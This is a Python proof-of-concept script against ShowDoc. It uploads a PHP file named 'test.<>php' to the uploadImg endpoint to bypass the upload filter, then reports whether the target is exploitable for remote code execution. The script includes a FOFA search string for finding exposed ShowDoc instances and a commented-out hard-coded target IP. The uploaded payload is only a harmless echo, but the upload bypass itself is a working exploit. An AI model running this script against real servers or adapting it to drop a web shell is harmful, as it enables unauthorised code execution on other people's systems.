#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

import requests
import sys
import os
def title():
    print('+-------------------------------------------------------------------------+')
    print('+-------------------fofa:"app="ShowDoc""----------------------------------+')
    print('+--------------------User Format: poc_RCE.py------------------------------+')
    print('+-------------------------------------------------------------------------+')
def run(ip, port):
    proto = ['http', 'https']
    i = 0
    while i < len(proto):
        target = '{}://{}:{}'.format(proto[i], ip, port)
        proto_result = run_proto(target)
        if proto_result:
            return True
        else:
            i = i + 1
def run_proto(target):
    requests.packages.urllib3.disable_warnings()
    url = '{}/index.php?s=/home/page/uploadImg'.format(target)
    headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0',
                'Accept-Encoding': 'gzip, deflate',
                'Accept': '*/*',
                'Connection': 'close',
              }
    with open('test.<>php', 'a+') as f:
        f.writelines("<?php echo '123_test';?>")
    files = {'editormd-image-file': open('test.<>php', 'r+')}
    try:
        req = requests.post(url=url, headers=headers, files=files, timeout=1, verify=False)
        if req.status_code == 200 and 'url' in req.text and 'success' in req.text and 'http' in req.text:
            print(req.headers)
            print('+----------------------------------------------------+')
            return True
        else:
            pass
    except Exception as e:
        pass

if __name__ == '__main__':
    title()
    target = sys.argv[1]
    #target = '173.248.244.67:80'
    ip = target.split(':')[0]
    port = str(int(target.split(':')[1]))
    result = run(ip, port)
    if result:
        print('Exist')
    else:
        print('UnExist')
    if os.path.exists('test.<>php'):
        os.remove('test.<>php')
